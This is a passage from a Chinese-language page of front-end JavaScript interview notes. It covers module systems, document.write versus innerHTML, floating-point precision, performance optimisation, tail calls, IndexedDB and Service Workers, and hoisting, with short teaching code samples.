缺点：原型模式省略了构造函数模式传递初始化参数的过程，所有的实例在默认情况下都会取得默认的属性值，会在一定程度上造成不方便。</p> <h2 id="_28-js-模块化方案"><a href="#_28-js-模块化方案" class="header-anchor">#</a> 28. JS 模块化方案</h2> <ul><li>4种方案：CommonJS、AMD、CMD、ES6</li></ul> <h4 id="_1、commonjs"><a href="#_1、commonjs" class="header-anchor">#</a> 1、CommonJS</h4> <p>通过 require 来引入模块，通过 module.exports 定义模块的 输出接口。这种模块加载方案是服务器端的解决方案，它是以同步的方式来引入模块的，因为在 服务端文件都存储在本地磁盘，所以读取非常快，所以以同步的方式加载没有问题。但如果是在 浏览器端，由于模块的加载是使用网络请求，因此使用异步加载的方式更加合适。</p> <h4 id="_2、amd"><a href="#_2、amd" class="header-anchor">#</a> 2、AMD</h4> <p>采用异步加载的方式来加载模块，模块的加载不影响后面语句的 执行，所有依赖这个模块的语句都定义在一个回调函数里，等到加载完成后再执行回调函数。 require.js 实现了 AMD 规范。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// AMD 默认推荐 </span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;./a&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;./b&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
  <span class="token comment">// 依赖必须一开始就写好</span>
   a<span class="token punctuation">.</span><span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token comment">// 此处略去 100 行 </span>
   b<span class="token punctuation">.</span><span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="_3、cmd"><a href="#_3、cmd" class="header-anchor">#</a> 3、CMD</h4> <p>这种方案和 AMD 方案都是为了解决异步模块加载的问题，sea.js 实现 了 CMD 规范。它和 require.js 的区别在于模块定义时对依赖的处理不同和对依赖模块的执行 时机的处理不同。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// CMD</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">require<span class="token punctuation">,</span> exports<span class="token punctuation">,</span> module</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
  <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;./a&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  a<span class="token punctuation">.</span><span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
  <span class="token comment">// 此处略去 100 行 </span>
  <span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;./b&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 依赖可以就近书写 </span>
  b<span class="token punctuation">.</span><span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="_4、es6"><a href="#_4、es6" class="header-anchor">#</a> 4、ES6</h4> <p>使用 import 和 export 的形式来导入导出模块。</p> <h2 id="_29-documen-write-和-innerhtml-的区别"><a href="#_29-documen-write-和-innerhtml-的区别" class="header-anchor">#</a> 29. documen.write 和 innerHTML 的区别</h2> <h4 id="_1-基本定义对比"><a href="#_1-基本定义对比" class="header-anchor">#</a> 1.基本定义对比</h4> <table><thead><tr><th style="text-align:center;">​​特性</th> <th style="text-align:center;">​document.write()​</th> <th style="text-align:center;">​​element.innerHTML​</th></tr></thead> <tbody><tr><td style="text-align:center;">​​所属对象​</td> <td style="text-align:center;">document 全局方法</td> <td style="text-align:center;">DOM 元素的属性</td></tr> <tr><td style="text-align:center;">​​主要用途​</td> <td style="text-align:center;">文档流写入</td> <td style="text-align:center;">修改元素内部HTML</td></tr> <tr><td style="text-align:center;">​​执行时机​</td> <td style="text-align:center;">主要在页面加载时使用</td> <td style="text-align:center;">可在任意时刻使用</td></tr></tbody></table> <h4 id="_2-工作原理差异"><a href="#_2-工作原理差异" class="header-anchor">#</a> 2.工作原理差异</h4> <p>document.write()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 直接写入文档流</span>
document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">&quot;&lt;p&gt;Hello World&lt;/p&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 如果在页面加载后调用，会覆盖整个文档</span>
window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">&quot;This replaces the entire document!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>innerHTML</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 修改特定元素的HTML内容</span>
document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myDiv&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">&quot;&lt;p&gt;New content&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>

<span class="token comment">// 可以追加内容</span>
<span class="token keyword">const</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;myDiv&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
div<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> <span class="token string">&quot;&lt;p&gt;Appended content&lt;/p&gt;&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="_3-工作原理差异"><a href="#_3-工作原理差异" class="header-anchor">#</a> 3.工作原理差异</h4> <ul><li>3.1 执行时机的影响
​</li></ul> <ul><li><p>​document.write()​​:</p> <ul><li><strong>​页面加载期间</strong>​​：正常插入内容</li> <li><strong>​页面加载完成后​</strong>​：会清空整个文档，从头开始写入</li></ul></li> <li><p>innerHTML​​:</p> <ul><li>任何时候调用都只影响指定的元素</li> <li>不会影响文档其他部分</li></ul></li></ul> <ul><li>3.2 性能比较</li></ul> <table><thead><tr><th style="text-align:center;">​维度​</th> <th style="text-align:center;">​document.write()​</th> <th style="text-align:center;">​​element.innerHTML​</th></tr></thead> <tbody><tr><td style="text-align:center;">​​小量内容​</td> <td style="text-align:center;">较快</td> <td style="text-align:center;">较快</td></tr> <tr><td style="text-align:center;">大量内容​</td> <td style="text-align:center;">较慢（需重新解析整个文档）</td> <td style="text-align:center;">较快（局部更新）</td></tr> <tr><td style="text-align:center;">内存使用​</td> <td style="text-align:center;">可能导致重绘/回流</td> <td style="text-align:center;">更高效（虚拟DOM前最佳选择）</td></tr></tbody></table> <h4 id="现代替代方案"><a href="#现代替代方案" class="header-anchor">#</a> 现代替代方案</h4> <p>​​textContent​​ (防XSS)</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">&quot;Safe text content&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_30-0-1-0-2-0-3"><a href="#_30-0-1-0-2-0-3" class="header-anchor">#</a> 30. 0.1 + 0.2 != 0.3</h2> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0.1</span> <span class="token operator">+</span> <span class="token number">0.2</span> <span class="token operator">===</span> <span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">0.1</span> <span class="token operator">+</span> <span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0.30000000000000004</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>0.1 和 0.2 在二进制中是无限循环小数​​：
<ul><li>0.1（十进制）→ 0.0001100110011001100110011001100110011001100110011001101...（二进制）</li> <li>0.2（十进制）→ 0.001100110011001100110011001100110011001100110011001101...（二进制）</li></ul></li></ul> <p>JS数字采用  IEEE 754 双精度 64 位浮点数来存储,只能存储有限位数（52位尾数），因此会<strong>​截断</strong>​​，导致精度丢失。</p> <h4 id="解决方案"><a href="#解决方案" class="header-anchor">#</a> 解决方案</h4> <ul><li>（1）原生办法解决：</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.1</span> <span class="token operator">+</span> <span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.1</span> <span class="token operator">+</span> <span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0.3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>（2）转换为整数计算后再还原​</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.1</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">0.2</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0.3</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>（3）使用第三方库​，decimal.js​​（高精度计算）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> Decimal <span class="token keyword">from</span> <span class="token string">&quot;decimal.js&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> sum <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Decimal</span><span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">plus</span><span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sum<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_31-性能定义和性能优化"><a href="#_31-性能定义和性能优化" class="header-anchor">#</a> 31. 性能定义和性能优化</h2> <p><a href="https://mp.weixin.qq.com/s/Ah3L4VKh_RWY1_-AnrVbyQ" target="_blank" rel="noopener noreferrer">参考<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <ul><li>性能优化分为两个大的分类
1、加载时优化<br>
2、运行时优化</li></ul> <h3 id="_30-1、加载时性能"><a href="#_30-1、加载时性能" class="header-anchor">#</a> 30-1、加载时性能</h3> <p>顾名思义加载时优化 主要解决的就是让一个网站加载过程更快，比如压缩文件大小、使用CDN加速等方式可以优化加载性能。</p> <p><strong>检查加载性能的指标一般看：白屏时间和首屏时间</strong></p> <p>白屏时间：指的是从输入网址， 到页面开始显示内容的时间。<br>
首屏时间：指从输入网址， 到首屏页面内容渲染完毕的时间。</p> <ul><li>白屏时间计算</li></ul> <p>将代码脚本放在<code>head</code>标签前面就能获取白屏时间</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> performance<span class="token punctuation">.</span>timing<span class="token punctuation">.</span>navigationStart
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>首屏时间计算</li></ul> <p>在window.onload事件中执行以下代码，可以获取首屏时间</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> performance<span class="token punctuation">.</span>timing<span class="token punctuation">.</span>navigationStart
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h4 id="加载时性能优化"><a href="#加载时性能优化" class="header-anchor">#</a> 加载时性能优化</h4> <p>浏览器如果输入的是一个网址，首先要交给DNS域名解析 -&gt; 找到对应的IP地址 -&gt; 然后进行TCP连接 -&gt; 浏览器发送HTTP请求 -&gt; 服务器接收请求 -&gt; 服务器处理请求并返回HTTP报文 -&gt; 以及浏览器接收并解析渲染页面。<br>
从这一过程中，其实就可以挖出优化点，缩短请求的时间，从而去加快网站的访问速度，提升性能。</p> <p><strong>这个过程中可以提升性能的优化的点：</strong></p> <p>1、DNS解析优化，浏览器访问DNS的时间就可以缩短<br>
2、使用HTTP2<br>
3、减少HTTP请求数量<br>
4、减少http请求大小<br>
5、服务器端渲染<br>
6、静态资源使用CDN<br>
7、资源缓存，不重复加载相同的资源</p> <ul><li>1、DNS 预解析</li></ul> <p>用meta信息来告知浏览器, 当前页面要做DNS预解析</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>x-dns-prefetch-control<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>on<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在页面header中使用link标签来强制对DNS预解析</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>dns-prefetch<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://bdimg.share.baidu.com<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>注意：dns-prefetch需慎用，多页面重复DNS预解析会增加重复DNS查询次数。</strong></p> <ul><li>2、使用HTTP2</li></ul> <p>HTTP2带来了非常大的加载优化，所以在做优化上首先就想到了用HTTP2代替HTTP1。</p> <p>HTTP2相对于HTTP1有这些优点：<strong>解析速度快、多路复用、首部压缩、服务器推送</strong></p> <ul><li>3、减少HTTP请求数量</li></ul> <p>HTTP请求建立和释放需要时间。</p> <p>HTTP请求从建立到关闭一共经过以下步骤：</p> <p>1、客户端连接到Web服务器<br>
2、发送HTTP请求<br>
3、服务器接受请求并返回HTTP响应<br>
4、释放连接TCP链接</p> <ul><li>4、压缩、合并文件</li></ul> <p>压缩文件 -&gt; 减少HTTP请求大小,可以减少请求时间<br>
文件合并 -&gt; 减少HTTP请求数量。</p> <p>我们可以对html、css、js以及图片资源进行压缩处理，现在可以很方便的使用 webpack 实现文件的压缩</p> <p>JS压缩：UglifyPlugin<br>
CSS压缩：MiniCssExtractPlugin<br>
HTML压缩：HtmlWebpackPlugin<br>
图片压缩：image-webpack-loader</p> <ul><li>5、服务端启用gzip，减少传输文件的体积</li></ul> <h3 id="_30-2、运行时性能"><a href="#_30-2、运行时性能" class="header-anchor">#</a> 30-2、运行时性能</h3> <p>运行时性能是指页面运行时的性能表现，而不是页面加载时的性能。<br>
可以通过chrome开发者工具中的 Performance 面板来分析页面的运行时性能。</p> <h2 id="_32-尾调用及其好处"><a href="#_32-尾调用及其好处" class="header-anchor">#</a> 32. 尾调用及其好处</h2> <p>尾调用是指 <strong>​​一个函数的最后一步操作是调用另一个函数​</strong>​（且不需要保留当前函数的执行上下文）。</p> <ul><li>关键特征
<ul><li>必须是函数最后一步操作</li> <li>调用后不需要访问当前函数的变量</li> <li>不需要对返回值进行额外操作</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 非尾调用（需要执行加法操作）</span>
<span class="token keyword">function</span> <span class="token function">nonTailCall</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> x <span class="token operator">+</span> <span class="token function">someFunction</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 最后一步是加法</span>
<span class="token punctuation">}</span>

<span class="token comment">// 尾调用</span>
<span class="token keyword">function</span> <span class="token function">tailCall</span><span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">someFunction</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 纯粹的函数调用</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="尾调用的核心优势"><a href="#尾调用的核心优势" class="header-anchor">#</a> 尾调用的核心优势</h4> <ul><li>性能提升
<ul><li>​栈帧复用​​：避免每次调用创建新栈帧</li> <li>​内存效率​​：将O(n)空间复杂度降为O(1)</li> <li>​无限递归​​：理论上支持无限深度调用</li></ul></li></ul> <h2 id="_33-​​indexeddb​​-以及-service-worker-cache-api​"><a href="#_33-​​indexeddb​​-以及-service-worker-cache-api​" class="header-anchor">#</a> 33.​​IndexedDB​​ 以及 Service Worker + Cache API​</h2> <table><thead><tr><th style="text-align:center;">​​维度​</th> <th style="text-align:center;">​IndexedDB​</th> <th style="text-align:center;">Service Worker + Cache API​</th></tr></thead> <tbody><tr><td style="text-align:center;">​​数据用途​</td> <td style="text-align:center;">动态结构化数据（如用户数据、日志）</td> <td style="text-align:center;">静态资源或网络请求响应（如 HTML、API）</td></tr> <tr><td style="text-align:center;">​​离线支持​</td> <td style="text-align:center;">需配合 Service Worker 实现完整离线功能</td> <td style="text-align:center;">直接支持离线资源加载</td></tr> <tr><td style="text-align:center;">查询能力​</td> <td style="text-align:center;">支持复杂查询（索引、游标）</td> <td style="text-align:center;">仅能通过 URL 匹配缓存</td></tr> <tr><td style="text-align:center;">​​适用场景​</td> <td style="text-align:center;">数据库类应用（如本地笔记、编辑器）</td> <td style="text-align:center;">离线优先的 Web 应用（如新闻、文档阅读）</td></tr></tbody></table> <h4 id="indexeddb-客户端大规模结构化数据存储​"><a href="#indexeddb-客户端大规模结构化数据存储​" class="header-anchor">#</a> IndexedDB：客户端大规模结构化数据存储​</h4> <ul><li>核心特性​​
<ul><li>​类型​​：基于 JavaScript 的 NoSQL 数据库，支持索引、事务和异步操作。</li> <li>​容量​​：浏览器通常允许存储数百 MB 甚至 GB 级数据（取决于用户设备）。</li> <li>数据结构​​：存储键值对（值可以是复杂对象、文件二进制数据等）。</li> <li>异步 API​​：所有操作非阻塞，通过事件或 Promise 返回结果。
​​</li></ul></li> <li>适用场景​​
<ul><li>需要存储大量结构化数据（如用户生成的文档、离线应用数据）。</li> <li>需要高性能查询（通过索引快速检索）。</li> <li>需要事务支持（保证数据一致性，如金融类应用）。</li></ul></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 打开或创建数据库</span>
<span class="token keyword">const</span> request <span class="token operator">=</span> indexedDB<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'MyDatabase'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

request<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token comment">// 创建对象存储空间（类似表）</span>
  <span class="token keyword">const</span> store <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">keyPath</span><span class="token operator">:</span> <span class="token string">'id'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// 创建索引</span>
  store<span class="token punctuation">.</span><span class="token function">createIndex</span><span class="token punctuation">(</span><span class="token string">'nameIndex'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token literal-property property">unique</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

request<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token comment">// 插入数据</span>
  <span class="token keyword">const</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> store <span class="token operator">=</span> transaction<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  store<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 查询数据</span>
  <span class="token keyword">const</span> getRequest <span class="token operator">=</span> store<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  getRequest<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>getRequest<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// { id: 1, name: 'Alice', age: 30 }</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><h4 id="service-worker-cache-api-离线应用缓存​"><a href="#service-worker-cache-api-离线应用缓存​" class="header-anchor">#</a> Service Worker + Cache API：离线应用缓存​</h4> <ul><li><p>​Service Worker​​：</p> <ul><li>独立于主线程的脚本，可拦截网络请求、管理缓存。</li> <li>支持离线运行和后台同步。</li></ul></li> <li><p>​Cache API​​：</p> <ul><li>提供缓存存储机制（键值对，键为请求对象，值为响应对象）。</li> <li>可缓存 HTML、CSS、JS、图片等静态资源或 API 响应</li></ul></li> <li><p>适用场景​​</p> <ul><li>构建离线可用的 PWA（渐进式 Web 应用）。</li> <li>加速重复访问的静态资源加载。</li> <li>实现自定义缓存策略（如“网络优先，失败后回退缓存”）。</li></ul></li></ul> <h2 id="_34-预解析"><a href="#_34-预解析" class="header-anchor">#</a> 34. 预解析</h2> <p>预解析是 JavaScript 引擎在执行代码前的一个预处理阶段，它会将变量和函数声明提升到当前作用域的顶部。</p> <h4 id="_4-1-预解析的基本表现"><a href="#_4-1-预解析的基本表现" class="header-anchor">#</a> 4.1 预解析的基本表现</h4> <ul><li>变量声明提升（var）</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: undefined</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出: 5</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>实际执行顺序相当于：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> a<span class="token punctuation">;</span>          <span class="token comment">// 声明提升到作用域顶部</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 此时a已声明但未赋值</span>
a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>          <span class="token comment">// 赋值保留在原位置</span>
